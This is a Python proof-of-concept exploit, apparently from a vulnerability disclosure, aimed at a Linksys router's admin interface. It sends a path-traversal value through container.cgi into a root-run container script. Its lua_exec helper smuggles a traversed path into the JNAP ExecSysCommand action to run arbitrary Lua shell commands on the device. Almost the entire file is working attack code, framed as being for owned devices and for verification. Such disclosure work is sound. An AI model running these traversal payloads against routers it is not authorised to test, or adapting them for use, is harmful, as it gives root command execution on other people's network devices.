#!/usr/bin/env python3
"""PoC for report-7: container.cgi c_name path traversal into root service_container.sh.

1) GET /cgi-bin/container.cgi?CMD=install&c_name=..%2Fetc (admin Basic, 443)
   -> expect 200 "Installing container ../etc"; root service_container.sh runs
      (one wget to the vendor container mirror + lxc-start attempt, self-terminating)
2) sysevent container::get should read "../etc" (traversed name reached the root chain)
3) restore: clear container::get / container::run and verify

usage:
  set LN11_HOST=192.168.x.x
  set LN11_ADMIN_PASSWORD=<password>
  py -3 poc.py

For owned devices only; the install branch triggers one real wget on the device.
Self-contained: stdlib only.
"""
import base64
import http.client
import json
import os
import ssl
import time

NAME = "../etc"  # URL-encoded to ..%2Fetc on the wire
EXE = "http://linksys.com/jnap/diagnostics/ExecSysCommand"
TRAV = "/lib/libnl/cli/cls/../../../../usr/bin/lua"


def _conn(timeout=45.0):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return http.client.HTTPSConnection(
        os.environ.get("LN11_HOST", "192.168.1.1"), 443, timeout=timeout, context=ctx)


def container_cgi(cmd, name):
    pw = os.environ["LN11_ADMIN_PASSWORD"]
    auth = base64.b64encode(f"admin:{pw}".encode()).decode()
    path = f"/cgi-bin/container.cgi?CMD={cmd}&c_name=" + name.replace("/", "%2F")
    c = _conn()
    try:
        c.request("GET", path, headers={"Authorization": f"Basic {auth}"})
        r = c.getresponse()
        return r.read(1024 * 1024).decode("utf-8", "replace")
    finally:
        c.close()


def lua_exec(code):
    pw = os.environ["LN11_ADMIN_PASSWORD"]
    auth = base64.b64encode(f"admin:{pw}".encode()).decode()
    body = json.dumps({"cmd": TRAV, "param": "-e " + code},
                      separators=(",", ":")).encode()
    c = _conn(12.0)
    try:
        c.request("POST", "/JNAP/", body=body, headers={
            "X-JNAP-Action": EXE,
            "X-JNAP-Authorization": f"Basic {auth}",
            "Content-Type": "application/json; charset=UTF-8"})
        raw = c.getresponse().read(1024 * 1024).decode("utf-8", "replace")
    finally:
        c.close()
    try:
        return json.loads(raw)["output"]["cmdresult"]
    except Exception:
        return ""


def sysev_get(key):
    return lua_exec(r'local f=io.popen("sysevent get ' + key + r'") print(f:read("*a"))').strip()


def main():
    print("[1] CMD=install&c_name=..%2Fetc")
    body = container_cgi("install", NAME)
    print("    resp:", repr(body[:120]))
    time.sleep(2.0)
    g = sysev_get("container::get")
    print(f"[2] sysevent container::get = {g!r} (expect '../etc')")
    lua_exec(r'os.execute("sysevent set container::get \'\'")')
    lua_exec(r'os.execute("sysevent set container::run \'\'")')
    time.sleep(1.0)
    print(f"[3] reset: get={sysev_get('container::get')!r} run={sysev_get('container::run')!r} (expect empty)")
    return 0 if "Installing container" in body else 1


if __name__ == "__main__":
    raise SystemExit(main())
